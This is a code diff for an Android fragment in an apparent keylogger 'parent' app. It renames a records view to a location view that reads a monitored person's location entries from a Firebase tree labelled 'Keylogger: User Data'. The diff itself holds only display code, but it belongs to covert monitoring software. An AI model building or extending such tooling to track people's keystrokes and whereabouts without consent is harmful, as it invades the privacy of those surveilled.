@@ -1,11 +1,13 @@
 package com.maemresen.infsec.keyloggerParent;
 
 import android.content.Intent;
+import android.os.Build;
 import android.os.Bundle;
 import android.util.Log;
 import android.view.LayoutInflater;
 import android.view.View;
 import android.view.ViewGroup;
+import android.widget.TextView;
 
 import androidx.annotation.NonNull;
 import androidx.annotation.Nullable;
@@ -21,10 +23,13 @@ import com.google.firebase.database.DatabaseReference;
 import com.google.firebase.database.FirebaseDatabase;
 import com.google.firebase.database.ValueEventListener;
 
+import java.text.SimpleDateFormat;
 import java.util.ArrayList;
+import java.util.Date;
 import java.util.List;
+import java.util.Locale;
 
-public class AllRecordsFragment extends Fragment {
+public class LocationFragment extends Fragment {
     private DatabaseReference allRecordsRef;
     private RecyclerView recyclerView;
     private BadWordsAdapter adapter;
@@ -36,21 +41,22 @@ public class AllRecordsFragment extends Fragment {
     @Nullable
     @Override
     public View onCreateView( @NonNull LayoutInflater inflater, @Nullable ViewGroup container, @Nullable Bundle savedInstanceState ) {
-        View rootView = inflater.inflate( R.layout.all_records, container, false );
+        View rootView = inflater.inflate( R.layout.location_layout, container, false );
         
         
-        recyclerView = rootView.findViewById( R.id.AllRecordsrecycler );
+        recyclerView = rootView.findViewById( R.id.Locaionrecycler );
         recyclerView.setLayoutManager( new LinearLayoutManager( getContext() ) );
         textRecordsList = new ArrayList<>();
         adapter = new BadWordsAdapter( textRecordsList );
         recyclerView.setAdapter( adapter );
-        loadingAnimationView = rootView.findViewById( R.id.animationAllRecords );
+        loadingAnimationView = rootView.findViewById( R.id.animationLocation );
         
         loadingAnimationView.setAnimation( R.raw.skeleton_card );
+        
         // Set the animation loop and start
         loadingAnimationView.setRepeatCount( LottieDrawable.INFINITE );
         loadingAnimationView.playAnimation();
-        
+    
         String ownerName = "";
         String selectedDate = "";
         Bundle bundle = getArguments();
@@ -58,18 +64,18 @@ public class AllRecordsFragment extends Fragment {
             ownerName = bundle.getString( "OWNER_NAME" );
             selectedDate = bundle.getString( "SELECTED_DATE" );
         }
-        
+    
         UpdateFragment( ownerName, selectedDate );
         
         return rootView;
     }
     
-    public void UpdateFragment( String ownerName, String databaseName ) {
+    public void UpdateFragment(String ownerName,String databaseName){
         
         allRecordsRef = FirebaseDatabase.getInstance().getReference( "Keylogger: User Data" )
                 .child( ownerName )
                 .child( databaseName )
-                .child( "All Records" );
+                .child( "Location" );
         
         // Add a ValueEventListener to listen for changes in the data
         allRecordsRef.addValueEventListener( new ValueEventListener() {
